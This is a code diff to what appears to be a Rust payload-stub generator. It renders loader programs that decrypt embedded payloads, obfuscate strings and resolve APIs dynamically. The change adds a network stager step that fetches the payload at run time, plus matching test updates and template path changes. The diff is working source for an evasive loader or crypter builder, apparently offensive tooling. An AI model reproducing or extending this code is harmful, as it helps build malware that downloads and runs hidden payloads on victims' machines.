@@ -1,7 +1,7 @@
 //! Step-based stub rendering (schema 6).
 //!
 //! A schema-6 plan has one ordered `runtime:` list. This module renders
-//! `templates/stub/main.rs.tpl`: every Execution step embeds and decrypts its own
+//! `src/engine/templates/main.rs.tpl`: every Execution step embeds and decrypts its own
 //! payload, each technique gets its own `mod step_<i>` (so two steps can use the
 //! same technique without colliding on top-level names), and a generated runner
 //! walks the steps in order with the declared [`StepControl`] gating.
@@ -32,6 +32,7 @@ const REQUIRED: &[&str] = &[
     "$ARGS_BLOCK$",
     "$IMPORTS_BLOCK$",
     "$API_RESOLUTION_BLOCK$",
+    "$STAGER_BLOCK$",
 ];
 
 /// The shared stub helpers (string obfuscation and per-step decryption).
@@ -92,6 +93,10 @@ pub struct PayloadCipher {
     pub args_override: bool,
     /// Per-step unique marker.
     pub marker: String,
+    /// Whether the payload is staged (fetched at run time by a `network_stager`
+    /// step) rather than embedded. When true, `path`/`nonce`/`key`/`plaintext_len`
+    /// are unused.
+    pub staged: bool,
 }
 
 /// One resolved step handed to the renderer.
@@ -279,6 +284,18 @@ fn render_common(
             String::new()
         },
     );
+    values.insert(
+        "$STAGER_BLOCK$".to_string(),
+        if params
+            .steps
+            .iter()
+            .any(|step| matches!(step.technique, TechniqueKind::NetworkStager { .. }))
+        {
+            super::stager::render_block()
+        } else {
+            String::new()
+        },
+    );
     for (name, value) in &params.build_args {
         values.insert(format!("$ARG_{name}$"), value.clone());
     }
@@ -425,6 +442,36 @@ fn render_execution_block(
     let marker = strings
         .obfuscate(&payload.marker)
         .render_stub_expr("stub_marker");
+    let args = args_expr(&payload.args, strings);
+    let overridden = if payload.args_override {
+        "true"
+    } else {
+        "false"
+    };
+
+    if payload.staged {
+        // A staged payload is fetched at run time by a preceding `network_stager`
+        // step and read from the shared slot, so there is no embedded ciphertext.
+        return format!(
+            "    {{\n\
+             \x20       crate::set_stage_args({args}, {overridden});\n\
+             \x20       let mut image = crate::take_staged_payload()?;\n\
+             \x20       let stub_marker: String = {marker};\n\
+             \x20       eprintln!(\"{{stub_marker}}\");\n\
+             \x20       match step_{index}::payload(&mut image) {{\n\
+             \x20           Ok(code) => {{\n\
+             \x20               last = code;{success}\n\
+             \x20           }}\n\
+             \x20           Err(e) => {{{failure}}}\n\
+             \x20       }}\n\
+             \x20   }}\n",
+            args = args,
+            overridden = overridden,
+            marker = marker,
+            index = index,
+        );
+    }
+
     format!(
         "    {{\n\
          \x20       crate::set_stage_args({args}, {overridden});\n\
@@ -439,12 +486,8 @@ fn render_execution_block(
          \x20           Err(e) => {{{failure}}}\n\
          \x20       }}\n\
          \x20   }}\n",
-        args = args_expr(&payload.args, strings),
-        overridden = if payload.args_override {
-            "true"
-        } else {
-            "false"
-        },
+        args = args,
+        overridden = overridden,
         path = payload.path,
         nonce = hex::encode(payload.nonce),
         key = hex::encode(payload.key),
@@ -521,6 +564,7 @@ pub(crate) fn test_params(
                 args: Vec::new(),
                 args_override: false,
                 marker: stub::generate_stub_marker(),
+                staged: false,
             });
             StepPayload {
                 index,
@@ -563,6 +607,7 @@ mod tests {
             args: Vec::new(),
             args_override: false,
             marker: marker.to_string(),
+            staged: false,
         }
     }
 
@@ -620,8 +665,9 @@ mod tests {
     fn template() -> String {
         std::fs::read_to_string(
             std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+                .join("src")
+                .join("engine")
                 .join("templates")
-                .join("stub")
                 .join("main.rs.tpl"),
         )
         .expect("template")
